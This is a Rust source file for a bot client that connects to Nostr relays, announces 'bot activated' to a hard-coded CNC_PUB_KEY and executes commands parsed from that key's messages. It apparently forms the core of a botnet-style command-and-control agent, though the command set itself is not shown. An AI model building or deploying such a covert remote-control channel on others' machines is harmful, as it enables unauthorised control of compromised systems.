use nostr_sdk::prelude::*;
use uuid::Uuid;

pub mod state;

use state::State;

use crate::{
    CNC_PUB_KEY,
    command::Commands,
    session::{Session, SessionProps},
};

pub struct Config {
    pub name: Option<String>,
    pub display_name: Option<String>,
    pub private_key: Option<String>,
    pub relays: Vec<String>,
}

pub struct Bot {
    state: State,
    session: Session,
}

impl Bot {
    pub fn create(config: Config) -> Self {
        let name = match config.name {
            Some(name) => name,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let display_name = match config.display_name {
            Some(display) => display,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let state = State::default();

        let session = Session::create(SessionProps {
            name,
            display_name,
            relays: config.relays,
            private_key: config.private_key,
        });

        Self { state, session }
    }

    pub async fn run(&mut self) -> Result<()> {
        println!("[i] Connecting to relays");

        self.session.init().await?;

        self.session
            .update_metadata(self.state.to_string().as_str())
            .await?;

        self.session
            .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;

        let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
        let mut msg_stream = self.session.receive_msgs(pubkey).await?;
        let mut notes_stream = self.session.subscribe_notes(pubkey).await?;

        loop {
            tokio::select! {
                Some(msg) = msg_stream.next() => {
                    if let Some(cmd) = Commands::parse(msg.as_str()) {
                        if self.state.enabled {
                            cmd.execute(&mut self.state, &self.session).await?
                        }
                        // only allow enable commands when the bot is disabled
                        else if let Commands::Enable(_) = cmd {
                            cmd.execute(&mut self.state, &self.session).await?
                        }
                    } else {
                        self.session.send_msg(msg.as_str(), pubkey).await?;
                    }
                },
                Some(event) = notes_stream.next() => {
                    // Handle notes_stream similarly if needed
                    println!("Received note: {}", event.content);
                }
            }
        }
    }
}
